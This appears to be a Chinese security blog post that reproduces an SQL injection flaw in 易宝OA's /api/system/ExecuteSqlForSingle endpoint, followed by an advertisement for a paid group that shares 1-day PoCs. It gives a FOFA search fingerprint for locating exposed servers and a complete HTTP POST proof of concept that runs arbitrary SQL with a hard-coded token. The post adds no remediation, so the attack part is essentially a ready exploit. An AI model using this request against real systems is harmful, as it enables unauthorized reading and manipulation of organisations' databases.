#  【漏洞复现】易宝OA ExecuteSqlForSingle SQL注入漏洞   
WK安全  WK安全   2023-11-29 00:01  
  
```
免责声明
  由于传播、利用WK安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负
责，WK安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除
并致歉。谢谢！
```  
  
| 0x01 产品介绍  
  
      
易宝OA是中国软件服务及行业解决方案提供商，专注于提供个性化和专业化软件开发及创新技术研发服务，拥有软件服务、易宝智能、易宝设计、易宝教育、易宝产业等五大主营业务，涉及新零售、金融、政务等领域。  
  
| 0x02 影响版本  
```
易宝OA
```  
  
| 0x03 语法特征  
```
app:"易宝 OA"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1qkgPBQslIFHsNicmGocofTUKpGF7Ho3iaIJNhwzXXAUbJWlHWucZRwEGqQ0b6FMNkGI847vDU4rSE5xtWmrcZgw/640?wx_fmt=png&from=appmsg "")  
  
| 0x04 漏洞复现  
  
页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1qkgPBQslIFHsNicmGocofTUKpGF7Ho3iaFJF6oTknZwmd1zrIYS1JH4m8Hkz3HdMRaxdU6AeXWFZic5e1wDPdXpA/640?wx_fmt=png&from=appmsg "")  
  
POC  
```
POST /api/system/ExecuteSqlForSingle HTTP/1.1
Host: xxxx
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Length: 103

token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)
&strParameters
```  
  
**|**  
**知识星球的介绍**  
  
不好意思，兄弟们，这里给湘安无事星球打个广告，不喜欢的可以直接滑走哦。  
  
1.群主为什么要建知识星球？  
```
很简单为了恰饭哈哈哈，然后也是为了建立一个圈子进行交流学习和共享资源嘛
相应的也收取费用嘛，毕竟维持星球也需要精力
```  
  
2.知识星球有哪些资源？  
```
群里面联系群主是可以要一些免费的学习资料的，因为群里面大部分是大学生嘛
大学生不就是喜欢白嫖，所以大家会共享一些资料
没有的群主wk也有,wk除了不会pc,其他都能嫖hhh
```  
  
一些实战报告，截的部分  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62RcLSRwZcEVNtIZkzdBc6oFT9jYPTSicI2dfuibvXY2XkqPEcmFtWPIxw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62RB3woW60WbOxWFuYycTic8ltSWVvXRCHcpLIfl3tnaUI4rArq2YTPhw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62TzMgcj8bnia1VDlFiaE5HHo8DGBibrfGYLJibnlEZ8MaJD1H5bNjUM4WiaA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
一些1day的poc,这些也就是信息差，不想找可以让wk帮你们嫖,群主也会经常发  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62u6rIc801vEhGFYFsVtzrSKobQpybfzZvtmwOUjLStelMbJ5yg3Ouow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62oKLUAWOIwkcYbWfmE1JNBma2h9sEsJz7T6SRBOqz72gz9Cy0K7rlyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/S2ssjS1jNYsaic5UibibYwwA4tj3bicXuF62vibbG0Nu1NhibkJcshXVDrklAYuXlTIK7Frkia05hmQZRAXEgpxF0MHOg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
一些共享的资源  
```
1.刀客源码的会员
2.fofa 360高级会员
3.专属漏洞库
5.专属内部it免费课程
6.不定期直播分享（星球有录屏）
```  
  
技术交流可加下方wx  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/1qkgPBQslIF4licGevYiaCjMeNIKCDprSg7xdfCRBrV7VyavUGJcCN8pDLT5RD5dibuicQ0mURYGVLxvONKrpYewzQ/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/1qkgPBQslIHjS8eDgIsoh0FvaTB4Nn2fSBib61prlLqrEFW5XukrNYtbKSXpk1ZiaWSQHM9GLYV3VUYbPtQXqTGQ/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/1qkgPBQslIFRZnLwGGOc9l1PaxoiaZZcCgnC8CZwtgb2bcgt1TRUeRLanZ47thAXXgUUaXog9JPpD09wtwibh9IQ/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/1qkgPBQslIFRZnLwGGOc9l1PaxoiaZZcCSxoSdNQIUbpEgjlRNTITqP7ial5dIOLWFh6ibJyicQwVG2GDzoLQY3vpA/640?wx_fmt=jpeg "")  
  
